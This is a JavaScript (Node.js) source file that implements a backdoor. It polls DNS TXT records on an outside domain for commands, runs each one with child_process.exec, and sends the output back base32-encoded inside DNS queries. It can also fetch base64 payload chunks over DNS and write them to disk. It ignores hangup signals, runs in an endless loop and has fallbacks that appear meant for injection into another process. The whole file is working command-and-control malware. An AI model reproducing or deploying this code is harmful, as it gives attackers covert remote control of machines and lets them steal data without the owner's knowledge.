const DOMAIN = 'zcz.cflems.org';
const MAX_CHUNK_SIZE = 35;
const MAX_ENCODED_SIZE = 63;
const MAX_TOTAL_SIZE = 255 - DOMAIN.length;
const MAX_CHUNKS = Math.floor(MAX_TOTAL_SIZE / MAX_ENCODED_SIZE);
const NOP_SLEEP_TIME = 1;

if (typeof require === 'undefined')
  require = global.require || global.process.mainModule.constructor._load;
if (typeof process === 'undefined')
  process = global.process;

const dns = require('dns');
const cp = require('child_process');
const Buffer = require('buffer').Buffer;
const fs = require('fs');

process.on('SIGHUP', function() {});

function sleep(sec) {
  return new Promise(function(resolve) {
    setTimeout(resolve, 1000*sec);
  });
}

function getDNSText(dest) {
  return new Promise(function(resolve, reject) {
    dns.resolveTxt(dest, function(err, records) {
      if (err) reject(err);
      else resolve(records);
    });
  });
}

function system(cmd) {
  return new Promise(function(resolve, reject) {
    cp.exec(cmd, function (err, stdout, stderr) {
      resolve({stdout, stderr});
    });
  });
}

async function eventLoop() {
  while (true) {
    try {
      await event();
    } catch (e) {
      await sleep(NOP_SLEEP_TIME);
    }
  }
}

async function event() {
  const records = await getDNSText('asuh.' + DOMAIN);
  if (!records[0] || !records[0][0] || records[0][0] == 'nop') {
    await sleep(NOP_SLEEP_TIME);
    return;
  }

  for (const record of records) {
    const rtxt = record.join('');

    if (rtxt.startsWith('payload ')) {
      const args = rtxt.split(' ');
      if (args.length < 4) continue;

      const fn = args[1];
      const pd = args[2];
      const chunks = parseInt(args[3]);

      await storePayload(fn, pd, chunks);
      continue;
    }

    let {stdout, stderr} = await system(rtxt);
    let packets = [];
    stdout = stdout.trim();
    stderr = stderr.trim();

    if (stdout.length > 0) {
      for (let line of stdout.split('\n')) {
        packets = packets.concat(encode(line));
      }
    }
    if (stderr.length > 0) {
      for (line of stderr.split('\n')) {
        packets = packets.concat(encode(line));
      }
    }
    packets = packets.concat(encode('\xde\xadDN'));

    for (const packet of packets) {
      await getDNSText(packet + DOMAIN);
    }
  }
}

async function storePayload(name, desc, n_chunks) {
  const parallel = [];
  for (let i = 0; i < n_chunks; i++) {
    const req = encode('\xde\xadPL '+desc+' '+i)[0];
    parallel.push(getDNSText(req + DOMAIN).then(function(records) {
      return records.map(r => r.join('')).join('');
    }));
  }
  const chunks = await Promise.all(parallel);
  const buffer = Buffer.from(chunks.join(''), 'base64');
  fs.writeFileSync(name, buffer, {mode: 0o644});

  await getDNSText(encode('\xde\xadPD')[0] + DOMAIN);
}

function encode(s) {
  const packets = [];
  let parcel = '';

  while (s.length > 0) {
    const chunk = b32(s.substr(0, MAX_CHUNK_SIZE));
    if (parcel.length + chunk.length + 1 > MAX_TOTAL_SIZE) {
      packets.push(parcel);
      parcel = '';
    }
    parcel = chunk + '.' + parcel;
    s = s.substr(MAX_CHUNK_SIZE);
  }
  if (parcel.length > 0) packets.push(parcel);

  return packets;
}

function b32(s) {
  const a = 'abcdefghijklmnopqrstuvwxy1234567';
  const pad = 'z';
  const len = s.length;
  let o = '';
  let w, c, r=0, sh=0;
  for(let i=0; i<len; i+=5) {
    c = s.charCodeAt(i);
    w = 0xf8 & c;
    o += a.charAt(w>>3);
    r = 0x07 & c;
    sh = 2;

    if ((i+1)<len) {
      c = s.charCodeAt(i+1);
      w = 0xc0 & c;
      o += a.charAt((r<<2) + (w>>6));
      o += a.charAt( (0x3e & c) >> 1 );
      r = c & 0x01;
      sh = 4;
    }

    if ((i+2)<len) {
      c = s.charCodeAt(i+2);
      w = 0xf0 & c;
      o += a.charAt((r<<4) + (w>>4));
      r = 0x0f & c;
      sh = 1;
    }

    if ((i+3)<len) {
      c = s.charCodeAt(i+3);
      w = 0x80 & c;
      o += a.charAt((r<<1) + (w>>7));
      o += a.charAt((0x7c & c) >> 2);
      r = 0x03 & c;
      sh = 3;
    }

    if ((i+4)<len) {
      c = s.charCodeAt(i+4);
      w = 0xe0 & c;
      o += a.charAt((r<<3) + (w>>5));
      o += a.charAt(0x1f & c);
      r = 0;
      sh = 0;
    }
  }

  if (sh != 0) { o += a.charAt(r<<sh); }

  const padlen = 8 - (o.length % 8);

  if (padlen==8) { return o; }
  if (padlen==1) { return o + pad; }
  if (padlen==3) { return o + pad + pad + pad; }
  if (padlen==4) { return o + pad + pad + pad + pad; }
  if (padlen==6) { return o + pad + pad + pad + pad + pad + pad; }
  return false;
}

eventLoop();
